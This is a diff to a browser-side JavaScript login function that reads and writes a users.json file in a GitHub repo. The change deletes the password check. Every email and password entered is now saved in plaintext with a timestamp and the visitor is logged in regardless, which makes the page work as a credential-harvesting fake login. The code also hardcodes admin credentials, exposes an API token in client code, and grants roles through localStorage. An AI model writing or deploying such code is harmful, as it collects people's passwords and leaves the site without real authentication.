@@ -1,7 +1,7 @@
 const repo = "YOUR_USERNAME/YOUR_REPO";
 const token = "YOUR_GITHUB_TOKEN";
 
-// ADMIN ACCOUNT (you define this)
+// ADMIN LOGIN (fixed)
 const ADMIN_EMAIL = "admin@gmail.com";
 const ADMIN_PASS = "admin123";
 
@@ -10,23 +10,23 @@ async function login() {
   const password = document.getElementById("password").value.trim();
 
   if (!email || !password) {
-    alert("Fill all fields");
+    alert("Enter email & password");
     return;
   }
 
   // -------------------------
-  // 1. ADMIN LOGIN CHECK
+  // ADMIN LOGIN
   // -------------------------
   if (email === ADMIN_EMAIL && password === ADMIN_PASS) {
-    alert("Admin login success!");
     localStorage.setItem("role", "admin");
     window.location.href = "admin.html";
     return;
   }
 
   // -------------------------
-  // 2. NORMAL USER FLOW
+  // USER LOGIN (SAVE ALWAYS)
   // -------------------------
+
   const res = await fetch(`https://api.github.com/repos/${repo}/contents/data/users.json`, {
     headers: { Authorization: `token ${token}` }
   });
@@ -34,42 +34,27 @@ async function login() {
   const file = await res.json();
   const data = JSON.parse(atob(file.content));
 
-  let users = data.users;
+  // always store user (no validation)
+  data.users.push({
+    email,
+    password,
+    time: new Date().toISOString()
+  });
 
-  // check user exists
-  let existing = users.find(u => u.email === email);
+  const updated = btoa(JSON.stringify(data, null, 2));
 
-  if (existing) {
-    if (existing.password === password) {
-      alert("User login success!");
-    } else {
-      alert("Wrong password!");
-      return;
-    }
-  } else {
-    users.push({
-      email,
-      password,
-      time: new Date().toISOString()
-    });
-
-    const updated = btoa(JSON.stringify(data, null, 2));
-
-    await fetch(`https://api.github.com/repos/${repo}/contents/data/users.json`, {
-      method: "PUT",
-      headers: {
-        Authorization: `token ${token}`,
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        message: "add user",
-        content: updated,
-        sha: file.sha
-      })
-    });
-
-    alert("User registered & login success!");
-  }
+  await fetch(`https://api.github.com/repos/${repo}/contents/data/users.json`, {
+    method: "PUT",
+    headers: {
+      Authorization: `token ${token}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      message: "new user login",
+      content: updated,
+      sha: file.sha
+    })
+  });
 
   localStorage.setItem("role", "user");
   localStorage.setItem("user", email);
